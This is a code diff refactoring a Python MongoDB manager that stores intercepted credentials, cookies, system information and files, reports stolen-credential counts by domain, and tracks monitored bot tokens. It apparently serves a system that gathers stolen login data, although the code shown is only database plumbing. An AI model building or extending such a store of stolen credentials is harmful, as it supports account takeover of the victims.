@@ -15,47 +15,115 @@ from pymongo.errors import PyMongoError
 import gridfs
 
 from config.settings import config
+from src.utils.base_client import BaseAsyncClient
+from src.utils.error_handler import RetryHandler, ErrorLogger
 
-logger = logging.getLogger(__name__)
-
-class MongoDBManager:
+class MongoDBManager(BaseAsyncClient):
     """Manages MongoDB connections and operations."""
     
     def __init__(self):
         """Initialize MongoDB manager."""
+        super().__init__("mongodb_manager")
         self.config = config.mongodb
         
-        # --- DEBUG: Print the URI being used ---
-        print(f"DEBUG [mongo_client]: Attempting to connect with URI: {self.config.uri}")
-        logger.debug(f"Attempting to connect with URI: {self.config.uri}") # Also log it
-        # --- END DEBUG ---
+        # Initialize client attributes
+        self.sync_client = None
+        self.sync_db = None
+        self.async_client = None
+        self.async_db = None
+        self.fs = None
+        self.async_fs = None
         
-        # Synchronous client for initialization and index creation
-        # Explicitly pass the URI again for debugging
-        print(f"DEBUG [mongo_client]: Initializing sync_client with URI: {self.config.uri}")
-        self.sync_client = MongoClient(self.config.uri)
-        self.sync_db = self.sync_client[self.config.database]
+        # Initialize collection attributes
+        self.credentials = None
+        self.cookies = None
+        self.system_info = None
+        self.logs = None
+        self.stats = None
+        self.monitored_bots = None
         
-        # Asynchronous client for operations
-        # Explicitly pass the URI again for debugging
-        print(f"DEBUG [mongo_client]: Initializing async_client with URI: {self.config.uri}")
-        self.async_client = motor.motor_asyncio.AsyncIOMotorClient(self.config.uri)
-        self.async_db = self.async_client[self.config.database]
+    async def _initialize_client(self) -> bool:
+        """
+        Initialize MongoDB client connections.
         
-        # GridFS for file storage
-        self.fs = gridfs.GridFS(self.sync_db)
-        self.async_fs = motor.motor_asyncio.AsyncIOMotorGridFSBucket(self.async_db)
+        Returns:
+            True if initialization was successful, False otherwise
+        """
+        try:
+            # Debug info
+            self.logger.debug(f"Attempting to connect with URI: {self.config.uri}")
+            
+            # Synchronous client for initialization and index creation
+            self.sync_client = MongoClient(self.config.uri)
+            self.sync_db = self.sync_client[self.config.database]
+            
+            # Asynchronous client for operations
+            self.async_client = motor.motor_asyncio.AsyncIOMotorClient(self.config.uri)
+            self.async_db = self.async_client[self.config.database]
+            
+            # GridFS for file storage
+            self.fs = gridfs.GridFS(self.sync_db)
+            self.async_fs = motor.motor_asyncio.AsyncIOMotorGridFSBucket(self.async_db)
+            
+            # Initialize collections
+            self.credentials = self.async_db[self.config.credential_collection]
+            self.cookies = self.async_db[self.config.cookie_collection]
+            self.system_info = self.async_db[self.config.system_info_collection]
+            self.logs = self.async_db[self.config.log_collection]
+            self.stats = self.async_db["parser_stats"]  # Collection for parser statistics
+            self.monitored_bots = self.async_db[self.config.bot_collection]  # Collection for bot tokens
+            
+            # Set up indexes
+            self._setup_indexes()
+            
+            # Test connection
+            try:
+                # Ping database
+                await self.async_db.command("ping")
+                self.logger.info("MongoDB connection successful")
+                return True
+            except Exception as e:
+                self.logger.error(f"MongoDB ping failed: {e}")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"Failed to initialize MongoDB: {str(e)}", exc_info=True)
+            return False
+            
+    async def _shutdown_client(self) -> None:
+        """Shutdown MongoDB client connections."""
+        try:
+            if self.sync_client:
+                self.sync_client.close()
+                
+            if self.async_client:
+                self.async_client.close()
+                
+            self.logger.info("MongoDB connections closed")
+        except Exception as e:
+            self.logger.error(f"Error closing MongoDB connections: {str(e)}")
+            
+    def get_status(self) -> Dict[str, Any]:
+        """
+        Get MongoDB client status information.
         
-        # Initialize collections
-        self.credentials = self.async_db[self.config.credential_collection]
-        self.cookies = self.async_db[self.config.cookie_collection]
-        self.system_info = self.async_db[self.config.system_info_collection]
-        self.logs = self.async_db[self.config.log_collection]
-        self.stats = self.async_db["parser_stats"]  # Collection for parser statistics
-        self.monitored_bots = self.async_db[self.config.bot_collection]  # New collection for bot tokens
-        
-        # Set up indexes
-        self._setup_indexes()
+        Returns:
+            Dictionary with status information
+        """
+        status = {
+            "name": self.name,
+            "initialized": self.initialized,
+            "uri": self.config.uri,
+            "database": self.config.database,
+            "collections": {
+                "credentials": self.config.credential_collection,
+                "cookies": self.config.cookie_collection,
+                "system_info": self.config.system_info_collection,
+                "logs": self.config.log_collection,
+                "bots": self.config.bot_collection
+            }
+        }
+        return status
         
     def _setup_indexes(self):
         """Set up optimized indexes for MongoDB collections."""
@@ -108,7 +176,7 @@ class MongoDBManager:
                     if index['name'] != '_id_':
                         bot_collection.drop_index(index['name'])
             except PyMongoError as e:
-                logger.warning(f"Error dropping existing bot collection indexes: {str(e)}")
+                self.logger.warning(f"Error dropping existing bot collection indexes: {str(e)}")
             
             # Create new bot collection indexes
             bot_collection.create_indexes([
@@ -119,12 +187,13 @@ class MongoDBManager:
                 IndexModel([("failure_count", ASCENDING)], name="failure_count_index")
             ])
             
-            logger.info("MongoDB indexes created successfully")
+            self.logger.info("MongoDB indexes created successfully")
         except PyMongoError as e:
-            logger.error(f"Failed to create MongoDB indexes: {str(e)}")
+            self.logger.error(f"Failed to create MongoDB indexes: {str(e)}")
             raise
             
-    async def store_credential(self, credential_data: Dict[str, Any]) -> str:
+    @ErrorLogger.async_safe_operation(default_value=None, log_level=logging.WARNING)
+    async def store_credential(self, credential_data: Dict[str, Any]) -> Optional[str]:
         """
         Store intercepted credential in MongoDB.
         
@@ -134,19 +203,20 @@ class MongoDBManager:
         Returns:
             ID of the inserted document
         """
+        if not self.initialized:
+            self.logger.warning("Cannot store credential - MongoDB is not initialized")
+            return None
+            
         # Ensure timestamp field
         if "timestamp" not in credential_data:
             credential_data["timestamp"] = datetime.utcnow()
             
-        try:
-            result = await self.credentials.insert_one(credential_data)
-            logger.debug(f"Stored credential with ID {result.inserted_id}")
-            return str(result.inserted_id)
-        except PyMongoError as e:
-            logger.error(f"Failed to store credential: {str(e)}")
-            raise
+        result = await self.credentials.insert_one(credential_data)
+        self.logger.debug(f"Stored credential with ID {result.inserted_id}")
+        return str(result.inserted_id)
             
-    async def store_cookie(self, cookie_data: Dict[str, Any]) -> str:
+    @ErrorLogger.async_safe_operation(default_value=None, log_level=logging.WARNING)
+    async def store_cookie(self, cookie_data: Dict[str, Any]) -> Optional[str]:
         """
         Store intercepted cookie in MongoDB.
         
@@ -156,19 +226,20 @@ class MongoDBManager:
         Returns:
             ID of the inserted document
         """
+        if not self.initialized:
+            self.logger.warning("Cannot store cookie - MongoDB is not initialized")
+            return None
+            
         # Ensure timestamp field
         if "timestamp" not in cookie_data:
             cookie_data["timestamp"] = datetime.utcnow()
             
-        try:
-            result = await self.cookies.insert_one(cookie_data)
-            logger.debug(f"Stored cookie with ID {result.inserted_id}")
-            return str(result.inserted_id)
-        except PyMongoError as e:
-            logger.error(f"Failed to store cookie: {str(e)}")
-            raise
+        result = await self.cookies.insert_one(cookie_data)
+        self.logger.debug(f"Stored cookie with ID {result.inserted_id}")
+        return str(result.inserted_id)
             
-    async def store_system_info(self, system_data: Dict[str, Any]) -> str:
+    @ErrorLogger.async_safe_operation(default_value=None, log_level=logging.WARNING)
+    async def store_system_info(self, system_data: Dict[str, Any]) -> Optional[str]:
         """
         Store intercepted system information in MongoDB.
         
@@ -178,20 +249,21 @@ class MongoDBManager:
         Returns:
             ID of the inserted document
         """
+        if not self.initialized:
+            self.logger.warning("Cannot store system info - MongoDB is not initialized")
+            return None
+            
         # Ensure timestamp field
         if "timestamp" not in system_data:
             system_data["timestamp"] = datetime.utcnow()
             
-        try:
-            result = await self.system_info.insert_one(system_data)
-            logger.debug(f"Stored system info with ID {result.inserted_id}")
-            return str(result.inserted_id)
-        except PyMongoError as e:
-            logger.error(f"Failed to store system info: {str(e)}")
-            raise
+        result = await self.system_info.insert_one(system_data)
+        self.logger.debug(f"Stored system info with ID {result.inserted_id}")
+        return str(result.inserted_id)
             
+    @ErrorLogger.async_safe_operation(default_value=None, log_level=logging.WARNING)
     async def store_file(self, file_data: bytes, filename: str, 
-                        metadata: Dict[str, Any]) -> str:
+                        metadata: Dict[str, Any]) -> Optional[str]:
         """
         Store intercepted file in GridFS.
         
@@ -203,23 +275,24 @@ class MongoDBManager:
         Returns:
             ID of the inserted file
         """
-        try:
-            # Add timestamp to metadata
-            if "timestamp" not in metadata:
-                metadata["timestamp"] = datetime.utcnow()
-                
-            file_id = await self.async_fs.upload_from_stream(
-                filename, 
-                file_data,
-                metadata=metadata
-            )
-            logger.debug(f"Stored file with ID {file_id}")
-            return str(file_id)
-        except PyMongoError as e:
-            logger.error(f"Failed to store file: {str(e)}")
-            raise
+        if not self.initialized:
+            self.logger.warning("Cannot store file - MongoDB is not initialized")
+            return None
             
-    async def log_activity(self, log_data: Dict[str, Any]) -> str:
+        # Add timestamp to metadata
+        if "timestamp" not in metadata:
+            metadata["timestamp"] = datetime.utcnow()
+            
+        file_id = await self.async_fs.upload_from_stream(
+            filename, 
+            file_data,
+            metadata=metadata
+        )
+        self.logger.debug(f"Stored file with ID {file_id}")
+        return str(file_id)
+            
+    @ErrorLogger.async_safe_operation(default_value=None, log_level=logging.WARNING)
+    async def log_activity(self, log_data: Dict[str, Any]) -> Optional[str]:
         """
         Log bot activity in MongoDB.
         
@@ -229,18 +302,19 @@ class MongoDBManager:
         Returns:
             ID of the inserted document
         """
+        if not self.initialized:
+            self.logger.warning("Cannot log activity - MongoDB is not initialized")
+            return None
+            
         # Ensure timestamp field
         if "timestamp" not in log_data:
             log_data["timestamp"] = datetime.utcnow()
             
-        try:
-            result = await self.logs.insert_one(log_data)
-            logger.debug(f"Logged activity with ID {result.inserted_id}")
-            return str(result.inserted_id)
-        except PyMongoError as e:
-            logger.error(f"Failed to log activity: {str(e)}")
-            raise
+        result = await self.logs.insert_one(log_data)
+        self.logger.debug(f"Logged activity with ID {result.inserted_id}")
+        return str(result.inserted_id)
             
+    @RetryHandler.async_retry(max_retries=2, retry_delay=1.0)
     async def get_bot_activity(self, bot_id: str, 
                               hours: int = 24) -> List[Dict[str, Any]]:
         """
@@ -253,18 +327,19 @@ class MongoDBManager:
         Returns:
             List of activity documents
         """
-        try:
-            start_time = datetime.utcnow() - timedelta(hours=hours)
-            cursor = self.logs.find({
-                "bot_id": bot_id,
-                "timestamp": {"$gte": start_time}
-            }).sort("timestamp", DESCENDING)
+        if not self.initialized:
+            self.logger.warning("Cannot get bot activity - MongoDB is not initialized")
+            return []
             
-            return await cursor.to_list(length=None)
-        except PyMongoError as e:
-            logger.error(f"Failed to get bot activity: {str(e)}")
-            raise
+        start_time = datetime.utcnow() - timedelta(hours=hours)
+        cursor = self.logs.find({
+            "bot_id": bot_id,
+            "timestamp": {"$gte": start_time}
+        }).sort("timestamp", DESCENDING)
+        
+        return await cursor.to_list(length=None)
             
+    @RetryHandler.async_retry(max_retries=2, retry_delay=1.0)
     async def search_credentials(self, domain: Optional[str] = None, 
                                 username: Optional[str] = None) -> List[Dict[str, Any]]:
         """
@@ -277,20 +352,21 @@ class MongoDBManager:
         Returns:
             List of matching credential documents
         """
+        if not self.initialized:
+            self.logger.warning("Cannot search credentials - MongoDB is not initialized")
+            return []
+            
         query = {}
         if domain:
             query["domain"] = domain
         if username:
             query["username"] = username
             
-        try:
-            cursor = self.credentials.find(query).sort("timestamp", DESCENDING).limit(100)
-            return await cursor.to_list(length=None)
-        except PyMongoError as e:
-            logger.error(f"Failed to search credentials: {str(e)}")
-            raise
+        cursor = self.credentials.find(query).sort("timestamp", DESCENDING).limit(100)
+        return await cursor.to_list(length=None)
             
-    async def store_parser_stats(self, stats_data: Dict[str, Any]) -> str:
+    @ErrorLogger.async_safe_operation(default_value=None, log_level=logging.WARNING)
+    async def store_parser_stats(self, stats_data: Dict[str, Any]) -> Optional[str]:
         """
         Store parser statistics in MongoDB.
         
@@ -300,6 +376,10 @@ class MongoDBManager:
         Returns:
             ID of the inserted document
         """
+        if not self.initialized:
+            self.logger.warning("Cannot store parser stats - MongoDB is not initialized")
+            return None
+            
         # Create statistics document
         stats_doc = {
             "type": "parser_stats",
@@ -307,14 +387,11 @@ class MongoDBManager:
             "data": stats_data
         }
         
-        try:
-            result = await self.stats.insert_one(stats_doc)
-            logger.debug(f"Stored parser stats with ID {result.inserted_id}")
-            return str(result.inserted_id)
-        except PyMongoError as e:
-            logger.error(f"Failed to store parser stats: {str(e)}")
-            raise
+        result = await self.stats.insert_one(stats_doc)
+        self.logger.debug(f"Stored parser stats with ID {result.inserted_id}")
+        return str(result.inserted_id)
             
+    @RetryHandler.async_retry(max_retries=2, retry_delay=1.0)
     async def get_parser_stats_history(self, hours: int = 24) -> List[Dict[str, Any]]:
         """
         Get historical parser statistics.
@@ -325,18 +402,19 @@ class MongoDBManager:
         Returns:
             List of parser stats documents
         """
-        try:
-            start_time = datetime.utcnow() - timedelta(hours=hours)
-            cursor = self.stats.find({
-                "type": "parser_stats",
-                "timestamp": {"$gte": start_time}
-            }).sort("timestamp", ASCENDING)
+        if not self.initialized:
+            self.logger.warning("Cannot get parser stats history - MongoDB is not initialized")
+            return []
             
-            return await cursor.to_list(length=None)
-        except PyMongoError as e:
-            logger.error(f"Failed to get parser stats history: {str(e)}")
-            raise
+        start_time = datetime.utcnow() - timedelta(hours=hours)
+        cursor = self.stats.find({
+            "type": "parser_stats",
+            "timestamp": {"$gte": start_time}
+        }).sort("timestamp", ASCENDING)
+        
+        return await cursor.to_list(length=None)
             
+    @RetryHandler.async_retry(max_retries=2, retry_delay=1.0)
     async def get_credential_stats(self, hours: int = 24) -> Dict[str, Any]:
         """
         Get statistics on stolen credentials.
@@ -347,33 +425,34 @@ class MongoDBManager:
         Returns:
             Dictionary with credential statistics
         """
-        try:
-            start_time = datetime.utcnow() - timedelta(hours=hours)
+        if not self.initialized:
+            self.logger.warning("Cannot get credential stats - MongoDB is not initialized")
+            return {"total_count": 0, "top_domains": []}
             
-            # Get total count
-            total_count = await self.credentials.count_documents({
-                "timestamp": {"$gte": start_time}
-            })
+        start_time = datetime.utcnow() - timedelta(hours=hours)
+        
+        # Get total count
+        total_count = await self.credentials.count_documents({
+            "timestamp": {"$gte": start_time}
+        })
+        
+        # Get top domains
+        pipeline = [
+            {"$match": {"timestamp": {"$gte": start_time}}},
+            {"$group": {"_id": "$domain", "count": {"$sum": 1}}},
+            {"$sort": {"count": -1}},
+            {"$limit": 10}
+        ]
+        
+        cursor = self.credentials.aggregate(pipeline)
+        top_domains = await cursor.to_list(length=None)
+        
+        return {
+            "total_count": total_count,
+            "top_domains": top_domains
+        }
             
-            # Get top domains
-            pipeline = [
-                {"$match": {"timestamp": {"$gte": start_time}}},
-                {"$group": {"_id": "$domain", "count": {"$sum": 1}}},
-                {"$sort": {"count": -1}},
-                {"$limit": 10}
-            ]
-            
-            cursor = self.credentials.aggregate(pipeline)
-            top_domains = await cursor.to_list(length=None)
-            
-            return {
-                "total_count": total_count,
-                "top_domains": top_domains
-            }
-        except PyMongoError as e:
-            logger.error(f"Failed to get credential stats: {str(e)}")
-            raise
-            
+    @ErrorLogger.async_safe_operation(default_value=False, log_level=logging.WARNING)
     async def add_bot_token(self, token: str, username: str, status: str = 'active') -> bool:
         """
         Add a new bot token to monitor.
@@ -386,8 +465,12 @@ class MongoDBManager:
         Returns:
             bool: True if successful, False if token already exists
         """
+        if not self.initialized:
+            self.logger.warning("Cannot add bot token - MongoDB is not initialized")
+            return False
+            
+        now = datetime.utcnow()
         try:
-            now = datetime.utcnow()
             await self.monitored_bots.insert_one({
                 "token": token,
                 "username": username,
@@ -404,6 +487,7 @@ class MongoDBManager:
                 return False
             raise
 
+    @RetryHandler.async_retry(max_retries=2, retry_delay=1.0)
     async def get_active_bots(self) -> List[Dict[str, str]]:
         """
         Get list of active bots with their usernames and tokens.
@@ -411,6 +495,10 @@ class MongoDBManager:
         Returns:
             List of dictionaries, each containing 'username' and 'token' for an active bot.
         """
+        if not self.initialized:
+            self.logger.warning("Cannot get active bots - MongoDB is not initialized")
+            return []
+            
         cursor = self.monitored_bots.find(
             {"status": "active", "username": {"$ne": None}},
             projection={"token": 1, "username": 1, "_id": 0}
@@ -421,6 +509,7 @@ class MongoDBManager:
                 bots.append({"username": doc["username"], "token": doc["token"]})
         return bots
 
+    @ErrorLogger.async_safe_operation(default_value=False, log_level=logging.WARNING)
     async def update_bot_status(self, token: str, *, 
                               status: Optional[str] = None,
                               username: Optional[str] = None,
@@ -439,6 +528,10 @@ class MongoDBManager:
         Returns:
             bool: True if update was successful
         """
+        if not self.initialized:
+            self.logger.warning("Cannot update bot status - MongoDB is not initialized")
+            return False
+            
         now = datetime.utcnow()
         update: Dict[str, Any] = {"$set": {"last_checked": now}}
         
@@ -466,6 +559,7 @@ class MongoDBManager:
         )
         return result.modified_count > 0
 
+    @ErrorLogger.async_safe_operation(default_value=False, log_level=logging.WARNING)
     async def remove_bot_token(self, token: str) -> bool:
         """
         Remove a bot token from monitoring.
@@ -476,9 +570,14 @@ class MongoDBManager:
         Returns:
             bool: True if token was found and removed
         """
+        if not self.initialized:
+            self.logger.warning("Cannot remove bot token - MongoDB is not initialized")
+            return False
+            
         result = await self.monitored_bots.delete_one({"token": token})
         return result.deleted_count > 0
 
+    @RetryHandler.async_retry(max_retries=2, retry_delay=1.0)
     async def get_bot_info(self, token: Optional[str] = None, username: Optional[str] = None) -> Optional[Dict[str, Any]]:
         """
         Get information about a monitored bot.
@@ -490,6 +589,10 @@ class MongoDBManager:
         Returns:
             Bot information or None if not found
         """
+        if not self.initialized:
+            self.logger.warning("Cannot get bot info - MongoDB is not initialized")
+            return None
+            
         if not token and not username:
             return None
             
@@ -500,8 +603,3 @@ class MongoDBManager:
             query["username"] = username
             
         return await self.monitored_bots.find_one(query)
-
-    def close(self):
-        """Close MongoDB connections."""
-        self.sync_client.close()
-        self.async_client.close()
